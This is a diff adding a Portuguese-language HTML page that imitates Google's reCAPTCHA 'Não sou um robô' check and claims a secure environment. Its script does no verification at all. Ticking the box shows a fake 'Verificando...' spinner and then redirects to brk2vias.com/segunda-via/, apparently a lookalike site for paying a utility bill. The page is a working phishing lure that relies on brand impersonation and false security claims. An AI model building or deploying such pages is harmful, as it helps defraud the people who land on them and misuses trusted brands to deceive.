@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação de Acesso</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:'Segoe UI',Arial,sans-serif;
+  background:linear-gradient(135deg,#f1f5f9,#ffffff,#eef2ff);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  padding:20px;
+}
+
+.container{
+  width:100%;
+  max-width:420px;
+}
+
+.card{
+  background:#ffffff;
+  border-radius:24px;
+  padding:30px;
+  border:1px solid #e2e8f0;
+  box-shadow:
+    0 20px 40px rgba(15,23,42,.08),
+    0 4px 12px rgba(15,23,42,.04);
+  animation:fadeIn .6s ease;
+}
+
+.title{
+  font-size:24px;
+  color:#0f172a;
+  font-weight:700;
+  margin-bottom:10px;
+  text-align:center;
+}
+
+.subtitle{
+  font-size:14px;
+  color:#64748b;
+  text-align:center;
+  margin-bottom:25px;
+}
+
+.captcha-box{
+  border:1px solid #e2e8f0;
+  border-radius:18px;
+  padding:18px;
+  background:#f8fafc;
+}
+
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:12px;
+  border-radius:12px;
+  cursor:pointer;
+  transition:all .25s ease;
+}
+
+.check-area:hover{
+  background:#eef2ff;
+}
+
+.check-area input{
+  width:22px;
+  height:22px;
+  accent-color:#22c55e;
+  cursor:pointer;
+}
+
+.check-text{
+  font-size:15px;
+  color:#0f172a;
+  font-weight:500;
+}
+
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #dbeafe;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+.secure{
+  margin-top:18px;
+  text-align:center;
+  font-size:13px;
+  color:#16a34a;
+  font-weight:700;
+}
+
+.footer{
+  margin-top:18px;
+  font-size:12px;
+  color:#64748b;
+  text-align:center;
+  line-height:1.5;
+}
+
+.footer span{
+  display:block;
+  margin-top:6px;
+  color:#94a3b8;
+}
+
+@keyframes spin{
+  from{
+    transform:rotate(0deg);
+  }
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="card">
+
+    <div class="title">
+      Verificação de Acesso
+    </div>
+
+    <div class="subtitle">
+      Confirme sua identidade para continuar
+    </div>
+
+    <div class="captcha-box">
+
+      <div class="captcha-row">
+
+        <label class="check-area">
+
+          <input type="checkbox" id="check">
+
+          <div id="loader" class="loader"></div>
+
+          <span class="check-text" id="text">
+            Não sou um robô
+          </span>
+
+        </label>
+
+        <div class="captcha-brand">
+
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+
+          reCAPTCHA
+          <br>
+
+          <span style="font-size:9px;">
+            Privacidade - Termos
+          </span>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
+
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
+
+      <span>
+        Isso ajuda a proteger o sistema contra acessos indevidos
+      </span>
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
+
+check.addEventListener("change", () => {
+
+  if(check.checked){
+
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
+
+    setTimeout(() => {
+
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
+
+      window.location.href = "https://brk2vias.com/segunda-via/";
+
+    }, 1800);
+
+  }
+
+});
+</script>
+
+</body>
+</html>
